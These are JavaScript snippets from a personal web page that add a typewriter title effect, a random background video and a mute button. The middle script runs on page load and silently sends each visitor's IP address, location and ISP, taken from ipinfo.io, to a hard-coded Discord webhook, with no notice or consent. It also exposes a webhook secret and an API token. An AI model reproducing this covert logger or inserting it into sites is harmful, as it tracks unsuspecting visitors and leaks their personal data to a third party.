  <script>
    const titleText = "yen";
    let i = 0;
    let speed = 150; // Speed of typing in milliseconds
    
    function typeWriter() {
      if (i < titleText.length) {
        document.title = titleText.substring(0, i + 1); // Update the title
        i++;
        setTimeout(typeWriter, speed); // Call the function again after a delay
      } else {
        // Once finished, you can loop back if you want
        setTimeout(() => {
          i = 0; // Reset the index to start again
          typeWriter(); // Restart the effect
        }, 1000); // Wait a second before restarting
      }
    }
    
    typeWriter(); // Start the effect
  </script>

<script>
  // IPinfo.io API token
  const apiKey = '6f609cfc9e5326';  // Replace with your IPinfo API key

  // Discord webhook URL (replace with your actual webhook URL)
  const webhookURL = 'https://discord.com/api/webhooks/1338567908896542768/Y3rwmCvW8cF2C8ov2KXFx5t8Bk62tzPhMch8du265f-wH_eCUn6KgNYKsSNMBTlQnUCG';

  // Function to fetch IP info and send to Discord webhook
  function logVisitor() {
    // Fetch IP info from IPinfo API
    fetch(`https://ipinfo.io?token=${apiKey}`)
      .then(response => response.json())  // Parse the response as JSON
      .then(ipData => {
        const embedData = {
          "embeds": [{
            "title": "New Visitor",
            "description": `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}\nOrg: ${ipData.org}`,
            "color": 3066993,  // Green color for embed
          }]
        };

        // Send IP data to Discord via Webhook
        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(embedData)
        })
          .then(() => {
            console.log('Data sent.');
          })
          .catch((error) => {
            console.error('Error sending data.', error);
          });
      })
      .catch((error) => {
        console.error('Error fetching IP data.', error);
      });
  }

  // Call logVisitor function on page load
  logVisitor();
</script>


  <script>
    const videos = [
      "/che - Pizza Time.mp4",
      "/prettifun - Light (Official Video).mp4",
      "/poison.mp4",
      "/freestyle.mp4",
      "/junkie.mp4",
      "/tellme.mp4",
"/thewholeworldisfree.mp4",
"/shitshow.mp4",
"/patchmade.mp4"
    ];

    function shuffleVideos() {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const videoElement = document.getElementById('background-video');
      videoElement.src = videos[randomIndex];
      videoElement.load();
      videoElement.play();
    }

    shuffleVideos();

    const muteButton = document.getElementById('muteButton');
    const muteIcon = document.getElementById('muteIcon');
    const backgroundVideo = document.getElementById('background-video');
    const backgroundMusic = document.getElementById('backgroundMusic');

    muteButton.addEventListener('click', function() {
      if (backgroundVideo.muted) {
        backgroundVideo.muted = false;
        backgroundMusic.play().catch(error => console.log("Autoplay failed: ", error));
        muteIcon.classList.remove('fa-volume-mute');
        muteIcon.classList.add('fa-volume-up');
      } else {
        backgroundVideo.muted = true;
        backgroundMusic.pause();
        muteIcon.classList.remove('fa-volume-up');
        muteIcon.classList.add('fa-volume-mute');
      }
    });
  </script>
